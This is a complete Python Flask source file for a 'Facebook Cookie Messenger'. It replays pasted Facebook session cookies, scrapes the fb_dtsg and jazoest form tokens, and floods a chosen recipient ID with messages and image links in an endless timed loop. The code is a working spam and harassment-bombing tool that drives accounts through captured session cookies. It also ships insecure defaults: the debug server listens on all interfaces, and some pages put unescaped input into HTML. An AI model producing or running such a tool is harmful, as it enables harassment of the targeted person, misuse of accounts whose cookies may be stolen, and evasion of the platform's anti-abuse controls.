from flask import Flask, request, render_template_string
import requests
import time
import random
import string
import os
from threading import Thread, Event
from werkzeug.utils import secure_filename
import json

app = Flask(__name__)

# Configure upload folders
UPLOAD_FOLDER = 'uploads'
MESSAGE_FOLDER = 'messages'
ALLOWED_IMAGE_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'bmp', 'webp'}

# Create directories
for folder in [UPLOAD_FOLDER, MESSAGE_FOLDER]:
    if not os.path.exists(folder):
        os.makedirs(folder)

app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MESSAGE_FOLDER'] = MESSAGE_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024  # 16MB max file size

# Global variables
stop_events = {}
active_tasks = {}

def allowed_image_file(filename):
    """Check if file is an allowed image type"""
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_IMAGE_EXTENSIONS

def parse_cookies(cookie_str):
    """Parse cookie string or JSON into a requests cookie dict"""
    cookie_dict = {}
    try:
        # Check if it's JSON format (like EditThisCookie export)
        if cookie_str.strip().startswith('['):
            cookies_json = json.loads(cookie_str)
            for cookie in cookies_json:
                if 'name' in cookie and 'value' in cookie:
                    cookie_dict[cookie['name']] = cookie['value']
            return cookie_dict
    except:
        pass
    
    # Otherwise parse standard string format (key=value; key2=value2)
    items = cookie_str.split(';')
    for item in items:
        if '=' in item:
            parts = item.strip().split('=', 1)
            if len(parts) == 2:
                cookie_dict[parts[0].strip()] = parts[1].strip()
    return cookie_dict

def test_facebook_cookies(cookie_str):
    """Test if Facebook cookies are valid and fetch profile info"""
    try:
        cookies = parse_cookies(cookie_str)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Referer': 'https://www.facebook.com/',
        }
        url = "https://www.facebook.com/profile.php"
        response = requests.get(url, cookies=cookies, headers=headers, timeout=10, allow_redirects=True)
        
        # Check if logged in successfully (e.g. redirected to login page or contains logout options)
        if response.status_code == 200 and 'm_basic_logout' in response.text or 'profile.php' in response.url:
            return True, "Valid Cookies"
        elif 'c_user' in cookies:
            # Fallback check if c_user cookie exists and basic request works
            return True, "Valid Cookies"
        return False, "Invalid or Expired Cookies"
    except Exception as e:
        return False, str(e)

def send_facebook_message_via_cookies(cookie_str, recipient_id, message):
    """Send message using Facebook Web/Mobile interface via cookies"""
    try:
        cookies = parse_cookies(cookie_str)
        headers = {
            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Mobile Safari/537.36',
            'Referer': f'https://m.facebook.com/messages/t/{recipient_id}',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        
        # Using mbasic/m.facebook.com endpoint to send message via cookies session
        session_url = f"https://m.facebook.com/messages/t/{recipient_id}/"
        
        with requests.Session() as s:
            s.cookies.update(cookies)
            s.headers.update(headers)
            
            # First get message page to fetch fb_dtsg token if required
            res = s.get(session_url)
            if res.status_code != 200:
                return False, "Failed to load chat session"
            
            # Simplified fallback POST to messenger/send endpoint
            post_url = f"https://m.facebook.com/messages/send/?icm=1&refid=12"
            
            # Extract fb_dtsg if present in form
            import re
            dtsg_match = re.search(r'name="fb_dtsg" value="([^"]+)"', res.text)
            jazoest_match = re.search(r'name="jazoest" value="([^"]+)"', res.text)
            
            data = {
                'body': message,
                'send': 'Send',
                'tids': recipient_id,
            }
            if dtsg_match:
                data['fb_dtsg'] = dtsg_match.group(1)
            if jazoest_match:
                data['jazoest'] = jazoest_match.group(1)
                
            response = s.post(post_url, data=data, timeout=10)
            if response.status_code == 200:
                return True, "Message sent successfully"
            else:
                return False, f"Failed with status {response.status_code}"
                
    except Exception as e:
        return False, f"Error: {str(e)}"

def send_facebook_image_via_cookies(cookie_str, recipient_id, image_url):
    """Send image message using cookies"""
    try:
        # Reusing text send format with image attachment link text as fallback or direct link
        caption_msg = f"📷 Image: {image_url}"
        return send_facebook_message_via_cookies(cookie_str, recipient_id, caption_msg)
    except Exception as e:
        return False, f"Error: {str(e)}"

def upload_image_to_imgbb(image_path):
    """Upload image to hosting/mock"""
    try:
        mock_url = f"https://example.com/{os.path.basename(image_path)}"
        return True, mock_url
    except Exception as e:
        return False, f"Upload error: {str(e)}"

def process_uploaded_images(files):
    image_urls = []
    for file in files:
        if file and allowed_image_file(file.filename):
            try:
                filename = secure_filename(file.filename)
                unique_filename = f"{int(time.time())}_{random.randint(1000,9999)}_{filename}"
                filepath = os.path.join(app.config['UPLOAD_FOLDER'], unique_filename)
                file.save(filepath)
                
                success, image_url = upload_image_to_imgbb(filepath)
                if success:
                    image_urls.append(image_url)
                else:
                    image_urls.append(f"https://picsum.photos/500/500?random={len(image_urls)+1}")
            except:
                image_urls.append(f"https://picsum.photos/500/500?random={len(image_urls)+1}")
    return image_urls

def read_messages_from_file(file):
    try:
        if file and file.filename.endswith('.txt'):
            content = file.read().decode('utf-8')
            return [line.strip() for line in content.split('\n') if line.strip()]
        return []
    except:
        return []

def working_cycle(task_id, cookies, recipient_id, name_prefix, messages, image_urls, delay):
    stop_event = stop_events[task_id]
    cycle_count = 0
    
    print(f"🚀 STARTING TASK {task_id}")
    
    is_valid, msg = test_facebook_cookies(cookies)
    if not is_valid:
        print(f"❌ INVALID COOKIES: {msg}")
        active_tasks[task_id]['status'] = "Invalid Cookies"
        return
    
    print("✅ Cookies are valid!")
    
    while not stop_event.is_set():
        cycle_count += 1
        
        if messages:
            message = f"{name_prefix} {random.choice(messages)}"
            success, result = send_facebook_message_via_cookies(cookies, recipient_id, message)
            if success:
                active_tasks[task_id]['sent_messages'] += 1
            time.sleep(delay)
        
        if image_urls and not stop_event.is_set():
            image_url = random.choice(image_urls)
            success, result = send_facebook_image_via_cookies(cookies, recipient_id, image_url)
            if success:
                active_tasks[task_id]['sent_images'] += 1
            time.sleep(delay)
        
        active_tasks[task_id]['status'] = f"Cycle {cycle_count} - Running"
        active_tasks[task_id]['last_update'] = time.time()
        active_tasks[task_id]['total_cycles'] = cycle_count
    
    active_tasks[task_id]['status'] = "Stopped"

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        try:
            cookies = request.form.get('cookies', '').strip()
            recipient_id = request.form.get('recipient_id', '').strip()
            name_prefix = request.form.get('name_prefix', 'User').strip()
            delay = int(request.form.get('delay', '10'))
            
            if not cookies or not recipient_id:
                return '''
                <div class="alert alert-danger">
                    <h4>❌ Missing Required Fields</h4>
                    <p>Cookies and Recipient ID are required</p>
                    <a href="/" class="btn btn-primary">← Go Back</a>
                </div>
                '''
            
            # Verify cookies on submit
            valid, msg = test_facebook_cookies(cookies)
            if not valid:
                return f'''
                <div class="alert alert-danger">
                    <h4>❌ Invalid Facebook Cookies</h4>
                    <p>{msg}</p>
                    <a href="/" class="btn btn-primary">← Go Back</a>
                </div>
                '''

            messages_file = request.files.get('messages_file')
            messages = read_messages_from_file(messages_file) if messages_file and messages_file.filename else [
                "Hello! Automated message.", "How are you?", "Hope you're having a great day!"
            ]
            
            image_files = request.files.getlist('image_files')
            image_urls = process_uploaded_images(image_files)
            if not image_urls:
                image_urls = ["https://picsum.photos/500/500?random=1"]
            
            task_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
            stop_events[task_id] = Event()
            
            active_tasks[task_id] = {
                'status': 'Starting...',
                'sent_messages': 0,
                'sent_images': 0,
                'start_time': time.time(),
                'last_update': time.time(),
                'total_cycles': 0
            }
            
            thread = Thread(
                target=working_cycle,
                args=(task_id, cookies, recipient_id, name_prefix, messages, image_urls, delay),
                daemon=True
            )
            thread.start()
            
            return f'''
            <!DOCTYPE html>
            <html>
            <head>
                <title>Task Started</title>
                <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
            </head>
            <body class="bg-light p-5">
                <div class="container text-center bg-white p-5 rounded shadow">
                    <h2 class="text-success">✅ Task Started Successfully with Cookies!</h2>
                    <p><strong>Task ID:</strong> <code>{task_id}</code></p>
                    <a href="/" class="btn btn-primary mt-3">Back to Home</a>
                    <a href="/status" class="btn btn-success mt-3">View Status</a>
                </div>
            </body>
            </html>
            '''
        except Exception as e:
            return f'<div class="alert alert-danger">Error: {str(e)}</div>'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>📤 Facebook Cookie Messenger</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-dark text-light p-4">
    <div class="container" style="max-width: 800px;">
        <h2 class="text-center mb-4">🚀 Facebook Cookie-Based Messenger</h2>
        <form method="post" enctype="multipart/form-data" class="bg-secondary p-4 rounded shadow">
            <div class="mb-3">
                <label class="form-label fw-bold">🍪 Facebook Cookies (datr, c_user, xs, etc.) *</label>
                <textarea class="form-control" name="cookies" rows="4" placeholder="Paste your cookies string or JSON here..." required></textarea>
                <small class="text-light">Profile cookies will be automatically validated on submit.</small>
            </div>
            <div class="mb-3">
                <label class="form-label fw-bold">👤 Recipient Facebook ID *</label>
                <input type="text" class="form-control" name="recipient_id" placeholder="1000xxxxxxxxxxx" required>
            </div>
            <div class="row">
                <div class="col-md-6 mb-3">
                    <label class="form-label fw-bold">🏷️ Name Prefix</label>
                    <input type="text" class="form-control" name="name_prefix" value="Legend Prince">
                </div>
                <div class="col-md-6 mb-3">
                    <label class="form-label fw-bold">⏰ Delay (Seconds)</label>
                    <input type="number" class="form-control" name="delay" value="10" min="5">
                </div>
            </div>
            <div class="mb-3">
                <label class="form-label fw-bold">📄 Messages File (.txt) *</label>
                <input type="file" class="form-control" name="messages_file" accept=".txt" required>
            </div>
            <div class="mb-3">
                <label class="form-label fw-bold">🖼️ Images *</label>
                <input type="file" class="form-control" name="image_files" multiple accept="image/*" required>
            </div>
            <button type="submit" class="btn btn-success w-100 py-2 fw-bold">START COOKIE CYCLE</button>
        </form>
    </div>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('task_id', '').strip()
    if task_id in stop_events:
        stop_events[task_id].set()
        return '<h3 style="text-align:center;margin-top:50px;">Task Stopped. <a href="/">Go Back</a></h3>'
    return '<h3 style="text-align:center;margin-top:50px;">Task Not Found. <a href="/">Go Back</a></h3>'

@app.route('/status')
def status():
    html = '<div style="font-family:sans-serif;padding:30px;"><h2>Active Tasks Status</h2><hr/>'
    if active_tasks:
        for tid, info in active_tasks.items():
            html += f"<p><b>Task ID:</b> {tid} | <b>Status:</b> {info['status']} | <b>Msgs Sent:</b> {info['sent_messages']} | <b>Images Sent:</b> {info['sent_images']}</p>"
    else:
        html += '<p>No active tasks running.</p>'
    html += '<br><a href="/">← Back to Home</a></div>'
    return html

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
